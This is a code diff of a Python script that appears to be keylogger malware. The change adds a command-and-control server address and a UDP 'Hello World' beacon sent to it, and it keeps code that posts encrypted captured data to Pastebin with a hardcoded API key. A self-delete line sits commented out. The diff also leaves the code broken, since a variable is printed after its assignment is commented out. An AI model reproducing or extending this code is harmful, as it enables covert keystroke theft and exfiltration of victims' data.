@@ -24,10 +24,16 @@ def key_thread():
 
 def main():
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    ip = "127.0.0.1"  # localhost
-    port = 10101
+    C2_ip = "0.0.0.0"  # Replace with C2 server IP
+    C2_port = 10101
+    C2_addr = (C2_ip, C2_port)
+    ip = "localhost"
+    port = 53
+    
     addr = (ip, port)
     sock.bind(addr)
+
+    sock.sendto("Hello World".encode(), C2_addr)
 
     dev_key = '475b38cdfbba7a92d8bde6c56adfb241'
     pastebin_url = "http://pastebin.com/api/api_post.php"
@@ -87,7 +93,7 @@ def main():
                 'api_paste_code': ciphertext,
                 'api_paste_private': 0,
                 'api_paste_name': 'key_test'}
-    key_url = requests.post(url=pastebin_url, data=key_data)
+    # key_url = requests.post(url=pastebin_url, data=key_data)
 
     print(key_url.text)  # print out url of paste
     # remove(argv[0])  # delete program after running
